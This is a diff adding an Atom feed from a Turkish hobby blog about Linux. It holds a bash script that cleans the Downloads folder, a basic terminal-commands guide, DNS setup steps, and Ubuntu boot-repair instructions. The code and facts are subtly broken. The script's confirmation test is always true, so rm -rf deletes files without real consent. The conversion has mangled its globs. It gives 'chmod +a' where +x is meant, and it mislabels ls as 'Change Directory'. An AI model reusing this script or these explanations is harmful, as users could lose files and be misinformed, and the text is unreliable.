+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Ve `main()` fonksiyonumuz. `readline` ile komutumuzu okuyoruz. komut NULL ise (yani ctrl - d ) programdan çıkıyoruz. Boş ise tekrar komut istiyoruz. Ve diğer durumda fonksiyonlarımızı çaığırıyoruz. `atexit` le ayırdığımız bellek alanlarının boşaltındığından emin oluyoruz.  
+
+Kodun tamamına [burdan](https://github.com/pasali/shellim/blob/master/shellim.c) ulaşabilirsiniz.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+ </entry>
+ 
+ <entry>
+   <title>Ubuntu Download Klasörü Temizleme</title>
+   <link href="http://mhmtbsl.net/2013/04/07/ubuntu-download-klasoru-temizleme/"/>
+   <updated>2013-04-07T23:08:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/04/07/ubuntu-download-klasoru-temizleme</id>
+   <content type="html">&lt;p&gt;Boş zamanlarında sürekli benim gibi film-dizi izleyenlerin genelde (en azından bende öyle) indirilenler klasöründe
+altyazılar,torrent dosyaları, arşivler ve film afişleri gibi bir sürü tek kulanımlık dosyalar olur. Her seferinde elle silmek biraz zaman aldığından bu işi benim için yapacak ufak bir kabuk betiği yazdım.
+&amp;lt;!-- more --&amp;gt;
+Kodlarımız şöyle:
+``` bash&lt;/p&gt;
+
+&lt;h1&gt;!/bin/bash&lt;/h1&gt;
+
+&lt;p&gt;case &amp;quot;$1&amp;quot; in
+   &amp;quot;-s&amp;quot;)
+        echo &amp;quot; &amp;#39;srt&amp;#39; ve &amp;#39;sub&amp;#39; uzantılı dosyalar silenecek?(e/h)&amp;quot;
+        read secim
+        if [ &amp;quot;$secim&amp;quot;==[eE] ]
+        then
+            rm -rf $HOME/Downloads/&lt;em&gt;.srt &amp;amp;&amp;amp; rm -rf $HOME/Downloads/&lt;/em&gt;.sub
+        fi
+    exit 1
+    ;;
+    &amp;quot;-t&amp;quot;)
+        echo &amp;quot;&amp;#39;torrent&amp;#39; uzantılı dosyalar silenecek?(e/h)&amp;quot;
+        read secim
+        if [ &amp;quot;$secim&amp;quot;==[eE] ]
+        then
+            rm -rf $HOME/Downloads/&lt;em&gt;.torrent
+        fi
+    exit 1
+    ;;
+    &amp;quot;-a&amp;quot;)
+        echo &amp;quot;Downloads dizinindeki tüm  dosyalar silenecek?(e/h)&amp;quot;
+        read secim
+        if [ &amp;quot;$secim&amp;quot;==[eE] ]
+        then
+            rm -rf $HOME/Downloads/&lt;/em&gt;
+        fi
+        ;;
+    &amp;quot;-n&amp;quot;)
+        path=$(find Downloads/ -type f -name $2)
+        echo $path
+        echo &amp;quot;Silinsin mi?(e/h)&amp;quot;
+        read secim
+        if [ &amp;quot;$secim&amp;quot;==[eE] ]
+        then
+            rm -rf &amp;quot;$path&amp;quot;
+        fi
+        ;;
+    &amp;quot;-e&amp;quot;)
+        echo &amp;quot;$2 uzantılı dosyalar silinecek?(e/h)&amp;quot;
+        read secim
+        if [ &amp;quot;$secim&amp;quot;==[eE] ]
+        then
+            rm -rf Downloads/*.&amp;quot;$2&amp;quot;
+        fi
+        ;;
+esac
+```&lt;/p&gt;
+
+&lt;h3&gt;Kodu Çalıştırma&lt;/h3&gt;
+
+&lt;p&gt;Öncelikle ev dizinde bin adında bir klasör oluşturun.&lt;br&gt;
+  Betiği bin klasörünün içine atın.&lt;br&gt;
+  Sonra betiğe çalışma izini verin.&lt;br&gt;
+&lt;code&gt;bash
+    sudo chmod +a bin/[dosya_ismi]
+&lt;/code&gt;
+.bashrc dosyasına alttaki satırı ekleyin
+&lt;code&gt;bash
+    PATH=$PATH:$HOME/bin
+&lt;/code&gt;
+artık dosya ismini yazarak betiği çalıştırabilirsiniz.&lt;br&gt;&lt;/p&gt;
+
+&lt;h3&gt;Kullanımı&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;-t&lt;/strong&gt;   =&amp;gt; torrent uzantılı dosyaları siler.&lt;br&gt;
+&lt;strong&gt;-s&lt;/strong&gt;   =&amp;gt; srt ver sub uzantlı dosyaları siler.&lt;br&gt;
+&lt;strong&gt;-a&lt;/strong&gt;   =&amp;gt; bütün dosyaları siler.&lt;br&gt;
+&lt;strong&gt;-n&lt;/strong&gt;   =&amp;gt; verilen isimli dosyayı siler.&lt;br&gt;
+&lt;strong&gt;-e&lt;/strong&gt;   =&amp;gt; verilen uzantılı dosyaları siler.&lt;br&gt;&lt;/p&gt;
+
+&lt;p&gt;Not:&lt;/p&gt;
+
+&lt;p&gt;Ubuntuyu Türkçe kullanıyorsanız. Downloads&amp;#39;ı kendinizdeki isimle değiştirin.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Linux Terminal Komutları I</title>
+   <link href="http://mhmtbsl.net/2013/04/07/linux-terminal-komutlari-i/"/>
+   <updated>2013-04-07T23:07:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/04/07/linux-terminal-komutlari-i</id>
+   <content type="html">&lt;p&gt;Az çok linux(Unix) işletim sistemi ile ilgisi olanlar komut satırını kullanmanın sağladığı gücü bilir.
+Bizde terminal komutlarını giriş yapalım. Burda temel komutları anlatmayı deneyeceğim. Bende daha öğrenme aşamasında olduğum için
+hatamız olursa kusuruma bakmayın.
+&amp;lt;!-- more --&amp;gt;&lt;/p&gt;
+
+&lt;h3&gt;cd&lt;/h3&gt;
+
+&lt;p&gt;Açılımı &lt;em&gt;Change Directory&lt;/em&gt; Türkçe meali ile &amp;quot;Dizin Değiştir&amp;quot;.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /Dosya/yolu &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Yolu verilen dizine götürür.&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Home(ev) dizinine götürür.&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ..          &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Bir üst dizine götürür.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;pwd&lt;/h3&gt;
+
+&lt;p&gt;Açılımı &lt;em&gt;Print Working Directory&lt;/em&gt; Türkçe meali ile &amp;quot;Çalışma Dizinini Yazdır&amp;quot;&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#=&amp;gt; İçinde bulunulan dizini gösterir.&lt;/span&gt;
+    /home/mhmt/Downloads&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;ls&lt;/h3&gt;
+
+&lt;p&gt;Açılımı &lt;em&gt;Change Directory&lt;/em&gt; Türkçe meali ile &amp;quot;Dizin Değiştir&amp;quot;.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ls            &lt;span class=&quot;c&quot;&gt;#=&amp;gt; İçinde bulunulan dizindeki dosya ve klasörleri listeler.&lt;/span&gt;
+    ls -a         &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Bütün gizli dosyalar ve klasörlerle beraber  listeler.&lt;/span&gt;
+    ls -l         &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Dosyaların izinlerini, sahiplerini, boyutlarını&lt;/span&gt;
+                  &lt;span class=&quot;c&quot;&gt;#=&amp;gt; ve son güncellenme tarihlerini ile beraber listeler.&lt;/span&gt;
+    ls -d         &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Sadece dizinleri listeler.&lt;/span&gt;
+    ls -ld        &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Verilen dizinin bilgilerini listeler.&lt;/span&gt;
+    ls /dizin     &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Verilen dizinin içini listeler.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;mkdir&lt;/h3&gt;
+
+&lt;p&gt;Açılımı &lt;em&gt;Make Directory&lt;/em&gt; Türkçe meali ile &amp;quot;Dizin Oluştur&amp;quot;.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mkdir dizin           &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Dizin adlı klasör oluşturur.&lt;/span&gt;
+    mkdir -p foo/bar/baz  &lt;span class=&quot;c&quot;&gt;#=&amp;gt; İç içe dizinler oluştur.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;touch&lt;/h3&gt;
+
+&lt;p&gt;&lt;em&gt;touch&lt;/em&gt; verilen isimde dosya oluştur. Eğer dosya varsa günceller.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;touch foo.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h3&gt;rm&lt;/h3&gt;
+
+&lt;p&gt;&amp;quot;ReMove&amp;quot; verilen dizin yada dosyayı siler.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;rm foo.txt          &lt;span class=&quot;c&quot;&gt;#=&amp;gt; foo.txt&amp;#39;i siler.&lt;/span&gt;
+    rm -d               &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Boş dizini siler.&lt;/span&gt;
+    rm -f               &lt;span class=&quot;c&quot;&gt;#=&amp;gt; Dizinin boş yada dolu olmasını umursamaz.&lt;/span&gt;
+    rm -r               &lt;span class=&quot;c&quot;&gt;#=&amp;gt; İç içe dizinleri siler.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Ubuntu Kalıcı DNS Ayarı</title>
+   <link href="http://mhmtbsl.net/2013/04/07/ubuntu-kalici-dns-ayari/"/>
+   <updated>2013-04-07T23:05:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/04/07/ubuntu-kalici-dns-ayari</id>
+   <content type="html">&lt;p&gt;&lt;strong&gt;Ubuntu&lt;/strong&gt;da DNS değiştirme işlemini konsoldan nasıl yaparız?&lt;br&gt;
+Öncelikle &lt;strong&gt;ctrl+alt+t&lt;/strong&gt; ile konsolumuzu açıyoruz.
+Sonra alttaki kodu giriyoruz.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    sudo gedit /etc/resolv.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Burda &lt;strong&gt;gedit&lt;/strong&gt; yerine siz hangi metin editörünü kullanıyorsanız onu yazabilirsiniz.&lt;br&gt;
+Sonra açılan pencerede isteğiniz DNS &lt;strong&gt;nameserver x.x.x.x&lt;/strong&gt; şeklinde yazabilirsiniz.&lt;br&gt;
+Örneğin google DNS için:
+&amp;lt;!-- more --&amp;gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    nameserver 8.8.8.8
+    nameserver 8.8.4.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;satırlarını &lt;strong&gt;resolv.conf&lt;/strong&gt; dosyasına ekleyin.
+Sonrada&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    sudo chattr +i /etc/resolv.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;diyerek herhangi bir şekilde bu dosyanın resetlenmesini engelleyebilirsiniz.(sudo ile bile değiştirilemez olur.)
+Bu özelliği kaldırmak içinse&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    sudo chattr -i /etc/resolv.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;kodunu kullanabilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Not:&lt;/strong&gt; 12.04 sürümünde chattr işe yaramıyor.Bunun nedenide resolv.conf dosyasının link olması dosyayı silip yeniden oluşturup yukardaki adımları uyguluyabilrisiniz.&lt;br&gt;
+Ya da&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    sudo gedit /etc/dhcp/dhclient.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Sonarada aşağıdaki yeri değiştirin&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    prepend domain-name-servers x.x.x.x, y.y.y.y;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Örnek:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;    prepend domain-name-servers 8.8.8.8, 8.8.4.4;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;değiştirerek ayarlayabilirsiniz.&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Windows Yükledikten Sonra Ubuntuyu Kurtarma</title>
+   <link href="http://mhmtbsl.net/2013/04/07/windows-yukledikten-sonra-ubuntuyu-kurtarma/"/>
+   <updated>2013-04-07T23:02:00+03:00</updated>
+   <id>http://mhmtbsl.net/2013/04/07/windows-yukledikten-sonra-ubuntuyu-kurtarma</id>
+   <content type="html">&lt;p&gt;&lt;em&gt;Ubuntu&lt;/em&gt;&amp;#39;nun üzerine &lt;em&gt;Windows&lt;/em&gt; kurdunuz ve artık bilgisayar açılırken size işletim sistemi seçiminizi
+sormadan &lt;em&gt;Windows&lt;/em&gt; mu açılıyor ?
+ Yakın zamanda bu sorunu yaşamış biri olarak size dilim döndüğünce yardımcı olmaya çalışayım.&lt;/p&gt;
+
+&lt;p&gt;Öncelikle elinizde bir &lt;strong&gt;Ubuntu liveCD&lt;/strong&gt; olmadığını var sayıyorum ve &lt;em&gt;Windows&lt;/em&gt; üzeriden neler yapabileceğimiz kısımdan yani &lt;em&gt;Ubuntu&lt;/em&gt;yu nasıl &lt;em&gt;Windows&lt;/em&gt;un boot menünüsüne ekleriz ondan
+bahsedeyim.
+&amp;lt;!-- more --&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;EasyBCD adılı program sayesinde bu işlemi gerçekleştirebiliriz.
+ &lt;a href=&quot;http://download.chip.eu/tr/EasyBCD-1.72_177662.html&quot;&gt;Burdan&lt;/a&gt; free sürümünü indirebilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;İndirme işlemini geçtikten sonra şimdi &lt;em&gt;Ubuntu&lt;/em&gt;nuzua erişmeninizi sağlayacak adımlara geçebiliriz.&lt;/p&gt;
+
+&lt;p&gt;Programı kurduktan sonra karşınıza şöyle bir ekran gelecek.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/resim1.jpg&quot; alt=&quot;EasyBCD1&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Sonra soldaki menüden &lt;strong&gt;Add New Entry( Yeni Giriş Ekle)&lt;/strong&gt; butonuna tıklıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/resim2.jpg&quot; alt=&quot;EasyBCD2&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Sonra açılan pencerede &lt;strong&gt;Operating Systems (İşletim Sistemleri)&lt;/strong&gt; menüsünden &lt;strong&gt;Linux/BSD&lt;/strong&gt; tabına tıklıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Type&lt;/strong&gt; sekmesine &lt;strong&gt;Grub 2&lt;/strong&gt; seçip, &lt;strong&gt;Name&lt;/strong&gt; kısmına da boot menüsünde görünecek ismi yazıyoruz.(&lt;em&gt;Ubuntu 10.04 gibi&lt;/em&gt;)&lt;/p&gt;
+
+&lt;p&gt;Son olarak da &lt;strong&gt;Add Entry&lt;/strong&gt;ye tıklayıp ekleme işlemini tamamlıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/resim3.jpg&quot; alt=&quot;EasyBCD3&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Edit Boot Menu&lt;/strong&gt; kısmından da öntanımlı işletim sistemini ayarlayabiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/resim4.jpg&quot; alt=&quot;EasyBCD3boot&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Burdaki işimizi bittikten sonra bilgisayarınızı yeniden başlattığınızda karşınıza şöyle bir boot ekranı gelmesi lazım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/bootekrani.png&quot; alt=&quot;Easybootek&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;LiveCD&lt;/em&gt;niz varsa seçenekleriniz artıyor. Bunlardan biride &lt;strong&gt;Boot-Repair&lt;/strong&gt; yazılımını kullanmak.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Boot-Repair&lt;/strong&gt;i yüklemek için aşığdaki adımları takip edebilirsiniz.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;LiveCD&lt;/em&gt;nizi takıp bilgisayarınızı CDden boot edin.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Try Ubuntu&lt;/em&gt; yada Türkçesiyle &lt;em&gt;Ubuntuyu dene&lt;/em&gt; butonuna tıklayın.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/livecd.jpg&quot; alt=&quot;Bootekrani&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Ctrl+alt+t&lt;/strong&gt; ile terminali açıp alttaki kodu girin.&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sudo add-apt-repository ppa:yannubuntu/boot-repair &amp;amp;&amp;amp; sudo apt-get update
+sudo apt-get install -y boot-repair
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Eğer hiçbir hata almadıysanız &lt;strong&gt;Boot-Repair&lt;/strong&gt; sisteminize kurulmuştur.
+  Terminalde&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;boot-repair
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;komutunu verin karşınıza aşığıdaki gibi bir pencere gelcek.
+ &lt;img src=&quot;/images/boot-repair.png&quot; alt=&quot;Boot-Repair&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Recommended Repair&lt;/strong&gt; butonuna tıkalyıp gerisini programa bırakıyoruz.
+ İnternetiniz yoksa bu yolu kullanamayacaksınız.Grubu elle düzeltmek zorundayız.Yine terminalimizi açıp:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sudo grub-install /dev/XXX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Burdaki &lt;strong&gt;XXX&lt;/strong&gt; &lt;em&gt;Ubuntu&lt;/em&gt;nun sizin bilgisayarınızda bulunduğu  bölümün ismini temsil ediyor.(&lt;em&gt;sda3 gibi&lt;/em&gt;)
+  Bunu bölümün ismini öğrenmek için terminaldeyken:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sudo fdisk -l
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Buna benzer bir çıktı almanız lazım.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/fdisk.png&quot; alt=&quot;fdisk&quot;&gt;&lt;/p&gt;
+
+&lt;p&gt;Benim bilgisayarımda &lt;strong&gt;sda3&lt;/strong&gt; bölümünde &lt;em&gt;Ubuntu&lt;/em&gt; kurulu.Yani:&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sudo grub-install /dev/sda3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;şeklinde olmalı.&lt;/p&gt;
+
+&lt;p&gt;daha fazlası &lt;a href=&quot;https://help.ubuntu.com/community/RecoveringUbuntuAfterInstallingWindows&quot;&gt;burada&lt;/a&gt;&lt;/p&gt;
+</content>
+ </entry>
+ 
+
+</feed>
